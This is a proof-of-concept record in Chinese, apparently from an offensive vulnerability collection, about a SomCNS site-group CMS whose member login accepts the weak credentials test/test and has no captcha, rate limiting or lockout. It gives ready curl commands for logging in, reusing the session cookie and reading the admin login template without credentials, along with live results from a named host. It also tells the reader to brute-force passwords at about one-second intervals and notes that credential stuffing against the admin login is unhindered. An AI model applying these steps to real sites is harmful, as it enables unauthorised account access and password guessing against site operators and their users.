# SomCNS 站群前台会员登录 /Home/Index/login 无验证码无频控，test/test 直登 + 后台登录模板零凭证可读

- **code**: somcns-站群前台会员登录-home-index-login-无验证码无频控-test-test-直登-后台登
- **kind**: poc
- **category**: weak-password
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）Home/Index::login
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-29 在 https://thbac1dsua6v.csnsg36j8n.xyz 实测：① POST /Home/Index/login body name=test&pwd=test → 200 {"ok":1,"ms":"登录成功","username":"test","balance":"0"} 并 Set-Cookie PHPSESSID；② 带该 Cookie GET /Index/user → 200/21307B 含 test、0.00 金币、level 0；去 Cookie 同 URL 200/21301B 不含 test（认证态对照）；③ 连续 34 组错误口令（间隔 0.7s）全部同一错误 JSON，无验证码、无 429、无锁定；④ GET /App/Tpl/Admin/Index_login.html 零凭证 → 200/1086B 后台登录模板源码（仅 username/password，无验证码字段）。
- **path**: pocs/somcns-站群前台会员登录-home-index-login-无验证码无频控-test-test-直登-后台登/poc.txt
- **tags**: thinkphp3.1.3,站群,弱口令,无频控,会员登录
- **created_at**: 2026-10-28T18:59:32.987Z
- **engine**: https://thbac1dsua6v.csnsg36j8n.xyz

## 描述

前台会员登录接口无验证码/无频控/无锁定，弱口令 test/test 可直接登录并读会员中心；后台同构登录模板可零凭证直读，确认后台登录接口同样只有 username/password 两字段。

## 用法

```
1) 验证弱口令：curl -k -X POST "https://TARGET/Home/Index/login" -d "name=test&pwd=test"
   # 成功判据 {"ok":1,"ms":"登录成功",...}
2) 认证态对照：curl -k -b "PHPSESSID=<上一步>" "https://TARGET/Index/user"
3) 后台模板确认：curl -k "https://TARGET/App/Tpl/Admin/Index_login.html"（1086B，字段 username/password）
4) 爆破时保持 ≥1s 间隔，无锁定但也别把站点打挂。
```

## 正文

```
## 实测
```
POST /Home/Index/login   name=test&pwd=test
→ 200 {"ok":1,"ms":"登录成功","username":"test","balance":"0"}   (Set-Cookie: PHPSESSID=...; HttpOnly)

GET /Index/user  Cookie: PHPSESSID=<同上>
→ 200/21307B，正文含 test、0.00 金币、level 0
GET /Index/user  无 Cookie → 200/21301B，不含 test（对照）

GET /App/Tpl/Admin/Index_login.html  零凭证
→ 200/1086B，<title>后台登录 - ...</title>，仅 username/password，无验证码/无 CSRF token
```

## 频控测试
连续 34 组错误口令（间隔 0.7s）：全部同一错误 JSON，无验证码刷新、无 429、无账号锁定 ⇒ 可在线无限速爆破。

## 影响
- 会员侧：弱口令账号直登，读取用户名/余额/等级
- 后台侧：登录接口结构与前台同构（username/password、无验证码），一旦拿到白名单入口即可无阻碍撞库
```
